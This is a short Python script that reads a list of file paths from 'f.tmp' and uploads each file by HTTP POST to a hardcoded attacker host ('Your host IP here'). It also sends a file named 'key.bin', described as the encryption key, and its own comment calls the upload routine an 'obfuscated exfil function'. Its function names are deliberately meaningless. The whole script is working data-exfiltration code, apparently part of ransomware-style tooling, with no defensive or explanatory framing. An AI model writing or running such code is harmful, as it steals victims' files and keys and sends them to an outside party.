import os
import requests

def r9(x1, x2='http://192.168.56.1:8000'):  # Your host IP here
    try:
        with open(x1, 'rb') as f:
            d = f.read()

        n = os.path.basename(x1)
        h = {'File-Name': n}
        r = requests.post(x2, data=d, headers=h)

        if r.status_code == 200:
            print(f"[+] Sent: {n}")
        else:
            print(f"[-] Fail: {n} (Code: {r.status_code})")
    except Exception as e:
        print(f"[-] Err {x1} -> {e}")

def z0():
    try:
        with open('f.tmp', 'r') as f:
            l = [i.strip() for i in f if i.strip()]
    except FileNotFoundError:
        print("f.tmp not found.")
        return

    for p in l:
        r9(p)

# Send the encryption key file to the server too
if os.path.exists('key.bin'):
    r9('key.bin')  # Reuses the same obfuscated exfil function


if __name__ == "__main__":
    z0()
